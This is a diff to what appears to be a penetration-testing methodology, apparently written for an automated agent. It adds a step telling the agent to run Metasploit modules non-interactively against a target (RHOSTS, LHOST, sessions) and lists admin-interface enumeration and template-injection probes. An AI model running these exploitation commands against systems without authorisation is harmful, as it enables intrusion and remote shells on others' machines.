@@ -38,6 +38,11 @@ Tech stack signals:
 | `X-GitHub-Enterprise-Version` | Nomad/collectd/syslog-ng config injection |
 
 ## Methodology
+0. **Prefer a vetted module over a hand-rolled exploit.** For a known CVE/product, check Metasploit
+   FIRST: `bash /root/vm.sh "msfconsole -q -x 'search <cve-or-product>; exit'"`. If a module exists,
+   run it non-interactively (`use <mod>; set RHOSTS <ip>; set LHOST <vpn-ip>; run -z; sessions -l;
+   exit`) rather than writing bespoke exploit code - faster, more reliable, and the exploit logic
+   lives in the vetted module. Hand-roll only when no module fits.
 1. Map execution contexts: template engines, shell commands, YAML parsers, file paths, package resolution
 2. Enumerate admin/management interfaces: `/management-console`, `/admin`, `/_internal`, `/setup`
 3. Template injection probe in every config/free-text field:
